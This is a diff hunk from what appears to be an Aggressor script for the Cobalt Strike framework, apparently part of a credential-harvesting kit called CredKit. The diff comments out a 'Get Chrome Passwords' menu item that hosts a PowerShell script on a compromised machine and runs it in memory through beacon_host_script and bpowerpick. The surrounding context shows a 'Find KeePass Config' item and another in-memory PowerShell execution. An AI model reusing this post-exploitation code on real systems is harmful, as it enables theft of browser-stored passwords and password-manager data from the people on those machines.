@@ -19,21 +19,21 @@ popup beacon_bottom {
 				bpowerpick($1, "$cmd");
 			}
 		}
-		item "Get Chrome Passwords"{
-			local('$bid');
-			foreach $bid ($1){
-				binput($1, "powershell-import Get-ChromePasswords.ps1");
-				# read in the powershell script
-				$handle = openf(script_resource("CredKit/scripts/Get-ChromePasswords.ps1"));
-				$chrome_script = readb($handle, -1);
-				closef($handle);
-				$cmd = beacon_host_script($bid, $chrome_script);
-				binput($bid, "powerpick Get-ChromePasswords");
-				sleep(50 * 1000);
-				# execute in-memory hosted script
-				bpowerpick($bid, "$cmd");
-			}
-		}
+		# item "Get Chrome Passwords"{
+		#	local('$bid');
+		#	foreach $bid ($1){
+		#		binput($1, "powershell-import Get-ChromePasswords.ps1");
+		#		# read in the powershell script
+		#		$handle = openf(script_resource("CredKit/scripts/Get-ChromePasswords.ps1"));
+		#		$chrome_script = readb($handle, -1);
+		#		closef($handle);
+		#		$cmd = beacon_host_script($bid, $chrome_script);
+		#		binput($bid, "powerpick Get-ChromePasswords");
+		#		sleep(50 * 1000);
+		#		# execute in-memory hosted script
+		#		bpowerpick($bid, "$cmd");
+		#	}
+		#}
 		item "Find KeePass Config"{
 			local('$bid');
 			foreach $bid ($1) {
